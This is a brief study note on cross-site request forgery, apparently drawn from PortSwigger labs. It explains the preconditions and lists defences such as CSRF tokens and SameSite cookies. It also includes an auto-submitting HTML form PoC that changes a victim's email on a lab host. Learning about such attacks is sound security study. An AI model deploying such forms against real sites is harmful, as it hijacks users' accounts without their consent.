# Cross-Site Request Forgery from portswigger

## What is it?
```
An attack that is related to making a request, ofcourse a malicious one, that is being sent to another user (victim) so that the request is being executed and send under the victim's name from server PoV.
```

## Keys on how CSRF going to work
```
- relevant action such as changing user's persoal data
- Cookie-based session handling, the server identifies user based on the cookie alone 
- No unpredictable request parameters. so when constructing a request, attacker finds some parameters is guessable and tried to tweaked it
```

## Simple [PoC](https://security.love/CSRF-PoC-Genorator) from security.love
```
<html>
    <form enctype="application/x-www-form-urlencoded" method="GET" action="https://0a9e001d030665d581a116ba002200e1.web-security-academy.net/my-account/change-email?email=foo%40web-security-academy.net&_method=POST">
        <input type="hidden" value="awd@gmail.com" name="email">
        <input type="hidden" value="POST" name="_method">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</html>
```

## Technologies used to prevent CSRF
- CSRF token: random token that is generated to add a little challenge from succeding a csrf attack
- SameSite cookies: restriction on how a cookie will be tranfered between different sites 
- Referer-based validation: using HTTP referer header to validate that the request comes from the app/web itself
